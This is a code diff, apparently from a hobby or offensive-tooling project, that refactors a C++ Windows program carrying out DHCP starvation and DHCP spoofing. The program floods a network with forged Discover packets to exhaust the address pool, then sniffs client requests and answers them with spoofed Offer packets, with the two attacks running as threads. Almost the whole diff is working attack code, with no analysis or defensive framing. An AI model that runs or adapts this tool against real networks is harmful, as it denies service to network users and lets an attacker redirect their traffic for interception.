@@ -19,13 +19,10 @@
 #include <WS2tcpip.h>
 #pragma pack(1)
 #pragma comment(lib, "Ws2_32.lib")
-#pragma comment(lib,"wpcap.lib")
 
 void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);
 
-
-
-void sendDiscoverPacket(AddressInfo& info)
+int sendDiscoverPacket(AddressInfo& info)
 {
 	SOCKET s;
 	sockaddr_in dst;
@@ -37,10 +34,12 @@ void sendDiscoverPacket(AddressInfo& info)
 
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket
 
-#if _DEBUG
 	if (s == SOCKET_ERROR)
+	{
 		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
-#endif
+		WSACleanup();
+		return 1;
+	}
 
 	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket
 
@@ -57,9 +56,10 @@ void sendDiscoverPacket(AddressInfo& info)
 	);
 	delete[] raw_packet;
 	closesocket(s);
+	return 0;
 }
 
-void recvDHCPPsackets(AddressInfo& info)
+int recvDHCPPsackets(AddressInfo& info)
 {
 	SOCKET s;
 	sockaddr_in sockinfo;
@@ -82,12 +82,21 @@ void recvDHCPPsackets(AddressInfo& info)
 	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
 
 	if (s == SOCKET_ERROR)
-		std::cout << "Socket error <" << WSAGetLastError() << ">" << WSACleanup() << std::endl;
+	{ 
+		std::cout << "Socket error <" << WSAGetLastError() << ">" <<  std::endl;
+		WSACleanup();
+		return 1;
+	}
+		
 
 	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));
 
 	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1) //Set the socket as a RAW socket
+	{
 		std::cout << "setsockopt error: " << WSAGetLastError() << std::endl;
+		WSACleanup();
+		return 1;
+	}
 	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);
 
 	char* raw_packet = new char[65536];
@@ -96,68 +105,71 @@ void recvDHCPPsackets(AddressInfo& info)
 	error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size);
 
 	if (error == SOCKET_ERROR)
+	{ 
 		std::cout << " recv error: " << WSAGetLastError() << WSACleanup() << std::endl;
+		WSACleanup();
+		return 1;
+	}
 
-	//std::cout << inet_ntoa(dst.sin_addr) << std::endl;
 	getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP);
-	sockinfo.sin_addr.s_addr = pIP.ip_destaddr;
 	if (ntohs(pUDP.dst_port) == 67)
 	{
-		std::cout << inet_ntoa(sockinfo.sin_addr) << std::endl;
 		if (checkForDHCP(pDHCP))
-			sendOfferPacket(pDHCP, info);
+			if (sendOfferPacket(pDHCP, pIP, info))
+				return 1;
 	}
 	delete[] raw_packet;
 	closesocket(s);
+	return 0;
 }
 
-void sendOfferPacket(DHCP_header& hHeader, AddressInfo& info)
+int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
 {
 	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
 	
 	char* raw_packet = new char[65536];
 	if (!sock)
-		std::cout << "error in pcap socket" << std::endl;
+	{
+		std::cout << "error in pcap socket" << std::endl; return 1;
+	}
+		
 	
-	CreateDHCPOfferPacket(raw_packet, (void*)&hHeader, info);
+	CreateDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);
 
-	std::cout << "check" << std::endl;
-	printHex((char*)&((Ethernet_header*)((u_char*)raw_packet))->frame_type, 2);
-	printIP(((IP_header*)((u_char*)raw_packet + sizeof(Ethernet_header)))->ip_destaddr);
-	std::cout << ntohs(((UDP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header)))->dst_port) << std::endl;
-	printHex(((DHCP_header*)((u_char*)raw_packet + sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header)))->chaddr, 6);
-	
 	if (pcap_sendpacket(
 		sock,
 		(u_char*)raw_packet,
 		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
 	) != 0)
-		std::cout << "error " <<  pcap_geterr(sock) << std::endl;
-
+	{
+		std::cout << "error " << pcap_geterr(sock) << std::endl;
+		return 1;
+	}
+		
+	
 #if _DEBUG
 	std::cout << "sent" << std::endl;
 #endif
 	delete[] raw_packet;
 	pcap_close(sock);
+	return 0;
 }
 
 
-void startDHCPStarvation(AddressInfo& info)
+DWORD WINAPI startDHCPStarvation(LPVOID info)
 {
 	
 	for (int i = 0; i < 1000; i++)
 	{
-		sendDiscoverPacket(info);
+		sendDiscoverPacket(*(AddressInfo*)info);
 		Sleep(20);
 	}
-
+	return 1;
 }
 
 
-void startDHCPSpoofing(AddressInfo& info)
+DWORD WINAPI startDHCPSpoofing(LPVOID info)
 {
-	while (1)
-	{
-		recvDHCPPsackets(info);
-	}
+	while (!recvDHCPPsackets(*(AddressInfo*)info)){}
+	return -1;
 }
